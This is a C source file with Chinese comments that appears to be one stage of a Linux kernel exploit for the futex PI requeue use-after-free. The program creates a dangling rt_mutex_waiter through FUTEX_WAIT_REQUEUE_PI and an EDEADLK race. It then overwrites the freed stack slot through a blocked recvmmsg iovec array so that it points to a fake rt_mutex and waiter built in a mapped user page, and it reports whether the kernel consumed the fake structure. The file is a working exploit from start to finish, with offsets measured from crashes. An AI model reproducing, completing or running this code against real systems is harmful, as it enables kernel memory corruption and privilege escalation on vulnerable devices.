/* P2.4c: 活帧喷灌终版（纯 recvmmsg）
 *
 * 事实（三次崩溃现场实测）：
 *   A 的悬空 rt_mutex_waiter = kernel_stack_top - 0x208
 *   recvmmsg iovstack 深度 0x1A0 -> 覆盖 waiter +0x10 .. +0x4f（含 lock@0x2c）
 *   waiter +0x00..+0x0f 保持 remove_waiter 里 plist_del 留下的自指残留（天然合法）
 *
 * 判据（无 panic 版）：
 *   链走消费到假 waiter   -> fake lock.owner == 0 -> 干净返回 0 -> T 正常阻塞在 u4
 *   链走没消费到（旧值）   -> 撞回真实 u2 链 -> 死锁检测 -> T 返回 EDEADLK(35)
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <stdint.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <time.h>

#define FUTEX_LOCK_PI 6
#define FUTEX_WAIT_REQUEUE_PI 11
#define FUTEX_CMP_REQUEUE_PI 12
#define SYS_RECVMMSG 365

struct mmsghdr_local { struct msghdr msg_hdr; unsigned int msg_len; };

static int futex(uint32_t *u, int op, uint32_t val, const struct timespec *to,
                 uint32_t *u2, uint32_t val3) {
    return syscall(SYS_futex, u, op, val, to, u2, val3);
}

static uint32_t u1 = 0, u2 = 0, u3 = 0, u4 = 0;
static int sv[2] = {-1, -1};
static uint8_t *page = NULL;
static uint32_t lock_addr;

static volatile int a_ready = 0, b_locked_u2 = 0, a_blocking = 0;
static volatile int t_ret = 999, t_errno = 0;

static void build_fake(void) {
    memset(page, 0, 0x2000);
    lock_addr = (uint32_t)(uintptr_t)(page + 0x100);
    uint32_t wnode = (uint32_t)(uintptr_t)(page + 0x200);

    /* 假 rt_mutex @ page+0x100 */
    *(uint32_t *)(page + 0x100) = 0;             /* wait_lock = 0（未锁） */
    *(uint32_t *)(page + 0x108) = wnode + 0xc;   /* wait_list.node_list.next */
    *(uint32_t *)(page + 0x10c) = wnode + 0xc;   /* wait_list.node_list.prev */
    *(uint32_t *)(page + 0x110) = 0;             /* owner = 0 -> 链走干净退出 */

    /* 假 plist_node（rt_mutex_waiter 形态）@ page+0x200 */
    *(uint32_t *)(page + 0x200) = 0;             /* prio = 0（最高） */
    *(uint32_t *)(page + 0x204) = wnode + 4;     /* prio_list 自指 */
    *(uint32_t *)(page + 0x208) = wnode + 4;
    *(uint32_t *)(page + 0x20c) = wnode + 0xc;   /* node_list 自指 */
    *(uint32_t *)(page + 0x210) = wnode + 0xc;
    *(uint32_t *)(page + 0x228) = 0;             /* task = 0 */
    *(uint32_t *)(page + 0x22c) = lock_addr;     /* lock（BUG_ON 校验） */
}

static void *thread_a(void *arg) {
    futex(&u3, FUTEX_LOCK_PI, 0, NULL, NULL, 0);   /* A 持 u3 */
    futex(&u4, FUTEX_LOCK_PI, 0, NULL, NULL, 0);   /* A 持 u4 */
    a_ready = 1;

    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_sec += 1; ts.tv_nsec += 500 * 1000 * 1000;
    while (ts.tv_nsec >= 1000000000) { ts.tv_sec++; ts.tv_nsec -= 1000000000; }
    futex(&u1, FUTEX_WAIT_REQUEUE_PI, 0, &ts, &u2, 0);  /* EDEADLK 后超时返回，pi_blocked_on 悬空 */

    /* recvmmsg 活帧喷灌：iovstack 深度 0x1A0 -> waiter +0x10..+0x4f */
    struct iovec iv[8];
    struct mmsghdr_local m;
    memset(iv, 0, sizeof iv);
    memset(&m, 0, sizeof m);
    iv[0].iov_base = (void *)(uintptr_t)(page + 0x20c);   /* +0x10 node_list.prev（写回目标） */
    iv[0].iov_len  = 0;                                   /* +0x14 pi_list.prio */
    iv[1].iov_base = (void *)(uintptr_t)(page + 0x218);   /* +0x18 pi.prio_list.next */
    iv[1].iov_len  = (size_t)(uintptr_t)(page + 0x218);   /* +0x1c pi.prio_list.prev */
    iv[2].iov_base = (void *)(uintptr_t)(page + 0x220);   /* +0x20 pi.node_list.next */
    iv[2].iov_len  = (size_t)(uintptr_t)(page + 0x220);   /* +0x24 pi.node_list.prev */
    iv[3].iov_base = (void *)(uintptr_t)0;                /* +0x28 task = 0 */
    iv[3].iov_len  = (size_t)(uintptr_t)lock_addr;        /* +0x2c lock = 假锁 */
    m.msg_hdr.msg_iov = iv; m.msg_hdr.msg_iovlen = 8;

    __sync_synchronize();
    a_blocking = 1;
    /* 阻塞在空 socket：iovec 作为活栈帧长驻 */
    syscall(SYS_RECVMMSG, sv[0], &m, 1, 0, NULL);
    for (;;) __sync_synchronize();     /* 意外返回后不再发起 syscall */
    return NULL;
}

static void *thread_b(void *arg) {
    nice(19);
    futex(&u2, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    b_locked_u2 = 1;
    futex(&u3, FUTEX_LOCK_PI, 0, NULL, NULL, 0);   /* 阻塞于 A 持有的 u3 */
    return NULL;
}

static void *thread_t(void *arg) {
    while (!a_blocking) __sync_synchronize();
    usleep(200000);                    /* 等 A 真正睡在 recvmmsg 里 */
    int r = futex(&u4, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    t_errno = errno; t_ret = r;
    printf("[T] LOCK_PI(u4)=%d (errno=%d)\n", r, t_errno);
    return NULL;
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("=== spray_block(recv-only) start pid=%d ===\n", getpid());

    page = mmap((void *)0x20000000, 0x2000, PROT_READ | PROT_WRITE,
                MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (page == MAP_FAILED)
        page = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED) { perror("mmap"); return 1; }
    printf("[M] page=%p lock=%p\n", page, page + 0x100);
    build_fake();

    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) != 0) { perror("socketpair"); return 1; }
    /* 不设 O_NONBLOCK、不写数据 -> recvmmsg 内部阻塞 */

    pthread_t ta, tb, tt;
    pthread_create(&ta, NULL, thread_a, NULL);
    while (!a_ready) __sync_synchronize();
    usleep(100000);

    pthread_create(&tb, NULL, thread_b, NULL);
    while (!b_locked_u2) usleep(200);
    usleep(200000);

    int r = futex(&u1, FUTEX_CMP_REQUEUE_PI, 1, NULL, &u2, 0);
    printf("[C] CMP_REQUEUE_PI=%d errno=%d %s\n", r, errno, errno == 35 ? "(EDEADLK 命中)" : "");

    pthread_create(&tt, NULL, thread_t, NULL);
    usleep(3500000);

    printf("[M] T ret=%d errno=%d\n", t_ret, t_errno);
    if (t_ret == 999) printf("\n*** VERDICT: T 仍阻塞 -> 链走消费了假 waiter（owner=0 干净退出） ***\n");
    else if (t_errno == 35) printf("\n*** VERDICT: T 返回 EDEADLK -> 链走没读到假 waiter（仍是旧值） ***\n");
    else printf("\n*** VERDICT: T 返回 %d errno=%d ***\n", t_ret, t_errno);
    return 0;
}
